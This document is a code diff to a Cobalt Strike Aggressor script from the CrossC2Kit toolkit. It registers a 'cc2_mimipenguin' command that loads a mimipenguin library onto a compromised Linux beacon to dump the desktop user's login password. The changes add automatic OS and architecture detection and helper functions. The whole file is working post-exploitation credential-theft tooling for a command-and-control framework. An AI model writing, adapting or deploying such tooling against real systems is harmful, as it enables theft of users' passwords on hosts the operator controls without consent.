@@ -2,30 +2,60 @@
 include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_mimipenguin {
-    blog($1, "\nUsage: cc2_mimipenguin <linux(32)/osx>\n\troot permissions\ndump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin linux");
+    blog($1, "\nUsage: cc2_mimipenguin\n\troot permissions\ndump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin");
 }
 
-ssh_alias cc2_mimipenguin {
+sub cc2_mimipenguin {
     $taskName = "cc2_mimipenguin"; # taskName
     $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
     $taskResType = "info"; # info -> normal message
 
     $beaconid = $1;
-    $arch = $2;
+
+    $os = lc(beacon_info($beaconid, "os"));
+    $arch = beacon_info($beaconid, "arch");
     $transportArg = "blankArg";
 
-    if ($arch eq "linux32") {
-        $loadlib = "gather/password/mimipenguin/mimipenguin32.so";
-    } else if ($arch eq "linux") {
-        $loadlib = "gather/password/mimipenguin/mimipenguin.so";
+    $loadlib = $null;
+
+    if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            $loadlib = "gather/password/mimipenguin/mimipenguin32.so";
+        } else if ($arch eq 'x64') {
+            $loadlib = "gather/password/mimipenguin/mimipenguin.so";
+        }
     } else {
         berror($beaconid, "*[error]: Only supports linux.");
-        printUsage_mimipenguin($beaconid);
-        return;
     }
-    blog($beaconid, "mimipenguin dump login password");
 
-    bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    if ($loadlib) {
+        blog($beaconid, "mimipenguin dump login password");
+        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    }
 }
 
-ssh_command_register("cc2_mimipenguin", "CrossC2 mimipenguin - dump the login password from the current linux desktop", "\nUsage: cc2_mimipenguin <linux(32)/osx>\n\tneed root permissions, dump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin linux");
+ssh_alias("cc2_mimipenguin", &cc2_mimipenguin);
+
+ssh_command_register("cc2_mimipenguin", "CrossC2 mimipenguin - dump the login password from the current linux desktop", "\nUsage: cc2_mimipenguin\n\tneed root permissions, dump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin");
+
+sub openMimipenguinDialog {
+    local('$bid $dialog');
+    $bid = $1;
+    binput($bid[0], "cc2_mimipenguin");
+    cc2_mimipenguin($bid[0]);
+}
+
+sub cc2_mimipenguin_status {
+    local('$bid $os $arch $system');
+    $bid = $1;
+    $os = lc(beacon_info($bid, "os"));
+    $arch = beacon_info($bid, "arch");
+    if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            return 'Linux32';
+        } else if ($arch eq 'x64') {
+            return 'Linux64';
+        }
+    }
+    return '';
+}
